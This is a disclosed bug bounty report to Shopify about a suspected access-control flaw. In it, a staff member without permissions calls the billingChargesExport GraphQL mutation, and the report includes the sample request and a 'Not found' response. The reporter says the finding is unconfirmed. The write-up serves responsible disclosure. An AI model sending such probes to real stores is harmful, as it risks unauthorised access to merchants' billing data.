# Low Privileged Staff Member Can Export Billing Charges

## Report Details
- **Report ID**: 1010835
- **URL**: https://hackerone.com/reports/1010835
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2020-10-18T03:35:59.203Z
- **Disclosed**: 2020-11-26T20:23:41.366Z

## Reporter
- **Username**: ash_nz
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: shopify

## Vulnerability Information
## Details
I'm not 100% sure about this because i don't have billing transactions on my account. However, from my experience on how Shopify backend respond, i think this is a valid finding just need confirmation from Shopify's security team.
A GraphQL mutation `billingChargesExport` can be used by a staff member with no permissions to export billing charges. The following is a sample request.

```http
POST /admin/internal/web/graphql/core HTTP/1.1
Cookie: [REDACTED]
accept: application/json
X-CSRF-Token: [REDACTED]
Content-Type: application/json
User-Agent: PostmanRuntime/7.26.5
Host: [YOUR-SHOP].myshopify.com
Accept-Encoding: gzip, deflate
Connection: close
Content-Length: 303

{"query":"\r\n        \r\nmutation BillingChargesExport($id:ID!,$exportFormat:ExportFormat){billingChargesExport(id:$id,exportFormat:$exportFormat){message userErrors{field message __typename}__typename}}\r\n","variables":{
"id": "gid://shopify/BillingInvoice/58138130",
"exportFormat":"EXCEL_CSV"
}}
```
The response i've got is the following.

```json

{
    "data": {
        "billingChargesExport": {
            "__typename": "BillingChargesExportPayload", 
            "message": null, 
            "userErrors": [
                {
                    "__typename": "UserError", 
                    "message": "Not found", 
                    "field": null
                }
            ]
        }
    }, 
    "extensions": {
        "cost": {
            "requestedQueryCost": 10, 
            "throttleStatus": {
                "restoreRate": 250.0, 
                "currentlyAvailable": 4990, 
                "maximumAvailable": 5000.0
            }, 
            "actualQueryCost": 10
        }
    }
}
```

I usually get `access denied` or something that indicates a privilege issue. However in this case i'm getting `Not found` which indicate that the resolver searched for the given `BillingInvoice` but could not find it. I can't confirm this from my side, hence reporting this.

## Impact

Low Privileged Staff Member Can Export Billing Charges

## Attachments
No attachments
